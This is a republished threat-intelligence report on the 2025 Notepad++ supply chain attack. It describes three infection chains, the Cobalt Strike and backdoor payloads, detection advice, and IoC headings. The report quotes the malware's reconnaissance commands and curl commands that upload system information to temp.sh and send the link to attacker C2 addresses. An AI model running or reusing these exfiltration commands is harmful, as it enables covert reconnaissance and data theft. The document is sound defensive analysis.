<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://securelist.com/notepad-supply-chain-attack/118708/">Original</a>
    <h1>Notepad&#43;&#43; supply chain attack breakdown</h1>
    
    <div id="readability-page-1" class="page"><div>
												<div>
													<h2 id="introduction">Introduction</h2>
<p>On February 2, 2026, the developers of Notepad++, a text editor popular among developers, <a href="https://notepad-plus-plus.org/news/hijacked-incident-info-update/" target="_blank">published a statement</a> claiming that the update infrastructure of Notepad++ has been compromised. According to the statement, this was due to a hosting provider level incident, which occurred from June to September 2025. However, attackers were able to retain access to internal services until December 2025.</p>
<h2 id="multiple-execution-chains-and-payloads">Multiple execution chains and payloads</h2>
<p>Having checked our telemetry related to this incident, we have been amazed to find out how different and unique were the execution chains used in this supply chain attack. We identified that over the course of four months, from July to October 2025, attackers who have compromised Notepad++ have been constantly rotating C2 server addresses used for distributing malicious updates, the downloaders used for implant delivery, as well as the final payloads.</p>
<p>We observed three different infection chains overall designed to attack about a dozen machines, belonging to:</p>
<ul>
<li>Individuals located in Vietnam, El Salvador and Australia;</li>
<li>A government organization located in the Philippines;</li>
<li>A financial organization located in El Salvador;</li>
<li>An IT service provider organization located in Vietnam.</li>
</ul>
<p>Despite the variety of payloads observed, Kaspersky solutions have been able to block the identified attacks as they occurred.</p>
<p>In this article, we describe the variety of the infection chains we observed in the Notepad++ supply chain attack, as well as provide numerous previously unpublished IoCs related to it. </p>
<h3 id="chain-1-late-july-and-early-august-2025">Chain #1 — late July and early August 2025</h3>
<p>We observed attackers to deploy a malicious Notepad++ update for the first time in late July 2025. It was hosted at http://45.76.155[.]202/update/update.exe. Notably, the first scan  of this URL on the VirusTotal platform occurred in late September, by a user from Taiwan.</p>
<p>The <code>update.exe</code> file downloaded from this URL (SHA1: 8e6e505438c21f3d281e1cc257abdbf7223b7f5a) was launched by the legitimate Notepad++ updater process, <code>GUP.exe</code>. This file turned out to be a NSIS installer, of about 1 MB in size. When started, it sends a heartbeat containing system information to the attackers. This is done through the following steps:</p>
<ol>
<li>The file creates a directory named <code>%appdata%\ProShow</code> and sets it as the current directory;</li>
<li>It executes the shell command <code>cmd /c whoami&amp;&amp;tasklist &gt; 1.txt</code>, thus creating a file with the shell command execution results in the <code>%appdata%\ProShow</code> directory;</li>
<li>Then it uploads the <code>1.txt</code> file to the temp[.]sh hosting service by executing the <code>curl.exe -F &#34;file=@1.txt&#34; -s https://temp.sh/upload</code> command;</li>
<li>Next, it sends the URL to the uploaded <code>1.txt</code> file by using the <code>curl.exe --user-agent &#34;https://temp.sh/ZMRKV/1.txt&#34; -s http://45.76.155[.]202</code> shell command. As can be observed, the uploaded file URL is transferred inside the user agent.</li>
</ol>
<p>Notably, the same behavior of malicious Notepad++ updates, specifically the launch of shell commands and the use of the temp[.]sh website for file uploading, <a href="https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh/3" target="_blank">has been described  on the Notepad++ community forums</a> by a user named soft-parsley.</p>
<ul>
<li>Drops the following files to the <code>%appdata%\ProShow</code> directory:
<ul>
<li><code>ProShow.exe</code> (SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)</li>
<li><code>defscr</code> (SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)</li>
<li><code>if.dnt</code> (SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)</li>
<li><code>proshow.crs</code> (SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)</li>
<li><code>proshow.phd</code> (SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)</li>
<li><code>proshow_e.bmp</code> (SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)</li>
<li><code>load</code> (SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)</li>
</ul>
</li>
<li>Executes the dropped <code>ProShow.exe</code> file.</li>
</ul>
<p>The launched <code>ProShow.exe</code> file is a legitimate ProShow software, which is abused to launch a malicious payload. Normally, when threat actors aim to execute a malicious payload inside a legitimate process, they resort to the DLL sideloading technique. However, this time attackers have decided to avoid using it — likely due to how much attention this technique receives nowadays. Instead, they abused an old, known vulnerability in the ProShow software, which dates back to early 2010s. The dropped file named <code>load</code> contains an exploit payload, which is launched when the <code>ProShow.exe</code> file is launched. It is worth noting that, apart from this payload, all files in the <code>%appdata%\ProShow</code> directory are legitimate.</p>
<p>Analysis of the exploit payload revealed that it contains two shellcodes — one at the very start and the other one in the middle of the file. The shellcode located at the start of the file contains a set of meaningless instructions and is not designed to be executed — rather, attackers used it as the exploit padding bytes. It is likely that, by using a fake shellcode for padding bytes instead of something else (e.g., a sequence of <code>0x41</code> characters or random bytes), attackers aimed to confuse researchers and automated analysis systems. </p>
<p>The second shellcode, which is stored in the middle of the file, is the one that is launched when <code>ProShow.exe</code> is started. It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it. </p>
<p>The Cobalt Strike Beacon payload is designed to communicate with the cdncheck.it[.]com C2 server. For instance, it uses the GET request URL https://45.77.31[.]210/api/update/v1 and the POST request URL https://45.77.31[.]210/api/FileUpload/submit.</p>
<p>Later on, in early August 2025, we have observed attackers to use the same download URL for the <code>update.exe</code> files (observed SHA1 hash: 90e677d7ff5844407b9c073e3b7e896e078e11cd), as well as the same execution chain for delivery of Cobalt Strike Beacon via malicious Notepad++ updates. However, we noted the following differences:</p>
<ul>
<li>In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;</li>
<li>The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit.</li>
</ul>
<p>We have not further seen any infections leveraging chain #1 after early August 2025.</p>
<h3 id="chain-2-middle-and-end-of-september-2025">Chain #2 — middle and end of September 2025</h3>
<p>A month and a half after malicious update detections ceased, we observed attackers to resume deploying these updates in the middle of September 2025, using another infection chain. The malicious update was still being distributed from the http://45.76.155[.]202/update/update.exe URL, and the file downloaded from it (SHA1 hash: 573549869e84544e3ef253bdba79851dcde4963a) was an NSIS installer as well. However, its file size was now about 140 KB. Again, this file performed two actions:</p>
<ul>
<li>Obtained system information by executing a shell command and uploading its execution results to temp[.]sh;</li>
<li>Dropped a next-stage payload on disk and launched it.</li>
</ul>
<p>Regarding system information, attackers made the following changes to how it was collected:</p>
<ul>
<li>They changed the working directory to %APPDATA%\Adobe\Scripts;</li>
<li>They started collecting more system information details, changing the executed shell command to <code>cmd /c &#34;whoami&amp;&amp;tasklist&amp;&amp;systeminfo&amp;&amp;netstat -ano&#34; &gt; a.txt</code>.</li>
</ul>
<p>The created <code>a.txt</code> file was, just as in the case of stage #1, uploaded to the temp[.]sh website through curl, with the obtained temp[.]sh URL being transferred to the same http://45.76.155[.]202/list endpoint, inside the User-Agent header.</p>
<p>As for the next-stage payload, it has been changed completely. The NSIS installer was configured to drop the following files to the %APPDATA%\Adobe\Scripts directory:</p>
<ul>
<li><code>alien.dll</code> (SHA1: 6444dab57d93ce987c22da66b3706d5d7fc226da);</li>
<li><code>lua5.1.dll</code> (SHA1: 2ab0758dda4e71aee6f4c8e4c0265a796518f07d);</li>
<li><code>script.exe</code> (SHA1: bf996a709835c0c16cce1015e6d44fc95e08a38a);</li>
<li><code>alien.ini</code> (SHA1: ca4b6fe0c69472cd3d63b212eb805b7f65710d33).</li>
</ul>
<p>Next, it executes the following shell command to launch the script.exe file: <code>%APPDATA%\%Adobe\Scripts\script.exe %APPDATA%\Adobe\Scripts\alien.ini</code>.</p>
<p>All of the files in the <code>%APPDATA%\Adobe\Scripts</code> directory, except for <code>alien.ini</code>, are legitimate and related to the Lua interpreter. As such, the previously mentioned command is used by attackers to launch a compiled Lua script, located in the <code>alien.ini</code> file.  Below is a screenshot of its decompilation:</p>
<p>The launched shellcode is, just in the case of chain #1, a Metasploit downloader, which downloads a Cobalt Strike Beacon payload, again in the form of a shellcode, from the https://cdncheck.it[.]com/users/admin URL.</p>
<p>The Cobalt Strike payload contains the C2 server URLs that slightly differ from the ones seen previously: https://cdncheck.it[.]com/api/getInfo/v1 and https://cdncheck.it[.]com/api/FileUpload/submit.</p>
<p>Attacks involving chain #2 continued until the end of September, when we observed two more malicious <code>update.exe</code> files. One of them had the SHA1 hash 13179c8f19fbf3d8473c49983a199e6cb4f318f0. The Cobalt Strike Beacon payload delivered through it was configured to use the same URLs observed in mid-September, however, attackers changed the way system information was collected. Specifically, attackers split the single shell command they used for this (<code>cmd /c &#34;whoami&amp;&amp;tasklist&amp;&amp;systeminfo&amp;&amp;netstat -ano&#34; &gt; a.txt</code>) into multiple commands:</p>
<ul>
<li><code>cmd /c whoami &gt;&gt; a.txt</code></li>
<li><code>cmd /c tasklist &gt;&gt; a.txt</code></li>
<li><code>cmd /c systeminfo &gt;&gt; a.txt</code></li>
<li><code>cmd /c netstat -ano &gt;&gt; a.txt</code></li>
</ul>
<p>Notably, the same sequence of commands has been previously documented by the soft-parsley user on the Notepad++ community forums.</p>
<p>The other <code>update.exe</code> file had the SHA1 hash 4c9aac447bf732acc97992290aa7a187b967ee2c. Using it, attackers performed the following:</p>
<ul>
<li>Changed the system information upload URL to https://self-dns.it[.]com/list;</li>
<li>Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;</li>
<li>Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;</li>
<li>Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query.</li>
</ul>
<h3 id="chain-3-october-2025">Chain #3 — October 2025</h3>
<p>In early October 2025, attackers changed the infection chain once again. They have as well changed the C2 server for distributing malicious updates, with the observed update URL being http://45.32.144[.]255/update/update.exe. The payload downloaded (SHA1: d7ffd7b588880cf61b603346a3557e7cce648c93) was still a NSIS installer, however, unlike in the case of chains 1 and 2, this installer did not include the system information sending functionality. It simply dropped the following files to the <code>%appdata%\Bluetooth\</code> directory:</p>
<ul>
<li><code>BluetoothService.exe</code>, a legitimate executable (SHA1: 21a942273c14e4b9d3faa58e4de1fd4d5014a1ed);</li>
<li><code>log.dll</code>, a malicious DLL (SHA1: f7910d943a013eede24ac89d6388c1b98f8b3717);</li>
<li><code>BluetoothService</code>, an encrypted shellcode (SHA1: 7e0790226ea461bcc9ecd4be3c315ace41e1c122).</li>
</ul>
<p>This execution chain relies on the sideloading of the <code>log.dll</code> file, which is responsible for launching the encrypted <code>BluetoothService</code> shellcode into the <code>BluetoothService.exe</code> process. Notably, such execution chains are commonly used by Chinese-speaking threat actors. This particular execution chain <a href="https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/" target="_blank">has already been described by Rapid7</a>, and the final payload observed in it is the custom Chrysalis backdoor. </p>
<p>Unlike the previous chains, chain #3 does not load a Cobalt Strike Beacon directly. However, in their article Rapid7 claim that they additionally observed a Cobalt Strike Beacon payload being deployed to the <code>C:\ProgramData\USOShared</code> folder, while conducting incident response on one of the machines infected with the Notepad++ supply chain attack. Whilst Rapid7 does not detail how this file was dropped to the victim machine, we can highlight the following similarities between that Beacon payload and the Beacon payloads observed in chains #1 and #2:</p>
<ol>
<li>In both cases, Beacons are loaded through a Metasploit downloader shellcode, with similar URLs used (api.wiresguard.com/users/admin for the Rapid7 payload, cdncheck.it.com/users/admin and http://45.77.31[.]210/users/admin for chain #1 and chain #2 payloads);</li>
<li>The Beacon configurations are encrypted with the XOR key <code>CRAZY</code>;</li>
<li>Similar C2 server URLs are used for Cobalt Strike Beacon communications (i.e. api.wiresguard.com/api/FileUpload/submit for the Rapid7 payload and https://45.77.31[.]210/api/FileUpload/submit for the chain #1 payload).</li>
</ol>
<h3 id="return-of-chain-2-and-changes-in-urls-october-2025">Return of chain #2 and changes in URLs — October 2025</h3>
<p>In mid-October 2025, we observed attackers to resume deployments of the chain #2 payload (SHA1 hash: 821c0cafb2aab0f063ef7e313f64313fc81d46cd) using yet another URL: http://95.179.213[.]0/update/update.exe. Still, this payload used the previously mentioned self-dns.it[.]com  and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications.</p>
<p>Further in late October 2025, we observed attackers to start changing URLs used for malicious update deliveries. Specifically, attackers started using the following URLs:</p>
<ul>
<li>http://95.179.213[.]0/update/install.exe;</li>
<li>http://95.179.213[.]0/update/update.exe;</li>
<li>http://95.179.213[.]0/update/AutoUpdater.exe.</li>
</ul>
<p>We haven’t observed any new payloads deployed from these URLs — they involved usage of both #2 and #3 execution chains. Finally, we have not seen any payloads being deployed starting from November 2025.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Notepad++ is a text editor used by numerous developers. As such, the ability to control update servers of this software gave attackers a unique possibility to break into machines of high-profile organizations around the world. The attackers made an effort to avoid losing access to this infection vector — they were spreading the malicious implants in a targeted manner, and they were skilled enough to drastically change the infection chains about once a month. Whilst we identified three distinct infection chains during our investigation, we would not be surprised to see more of them in use. To sum up our findings, here is the overall timeline of the infection chains that we identified:</p>
<ul>
<li>Check systems for deployments of NSIS installers, which have been used in all three observed execution chains. For example, this can be done by looking for logs related to creations of the <code>%localappdata%\Temp\ns.tmp</code> directory, made by NSIS installers at runtime. Make sure to investigate the origins of each identified NSIS installer to avoid false positives;</li>
<li>Check network traffic logs for DNS resolutions of the temp[.]sh domain, which is unusual to observe in corporate environments. Also, it is beneficial to conduct a check for raw HTTP traffic requests that have a temp[.]sh URL embedded in the user agent — both these steps will make it possible to detect chain #1 and chain #2 deployments;</li>
<li>Check systems for launches of malicious shell commands referenced in the article, such as <code>whoami</code>, <code>tasklist</code>, <code>systeminfo</code> and <code>netstat -ano</code>;</li>
<li>Use specific IoCs listed below to identify known malicious domains and files.</li>
</ul>
<h2 id="indicators-of-compromise">Indicators of compromise</h2>
<p>URLs used for malicious Notepad++ update deployments</p>
<p>System information upload URLs</p>
<p>URLs used by Metasploit downloaders to deploy Cobalt Strike beacons</p>
<p>URLs used by Cobalt Strike Beacons delivered by malicious Notepad++ updaters</p>
<p>URLs used by the Chrysalis backdoor and the Cobalt Strike Beacon payloads associated with it, as previously identified by Rapid7</p>
<p>URLs related to Cobalt Strike Beacons uploaded to multiscanners, as previously identified by Rapid7</p>
<p>Malicious updater.exe hashes</p>
<p>Hashes of malicious auxiliary files</p>
<p>Malicious file hashes, as previously identified by Rapid7</p>
<p>Malicious file paths</p>
												</div>
											</div></div>
  </body>
</html>
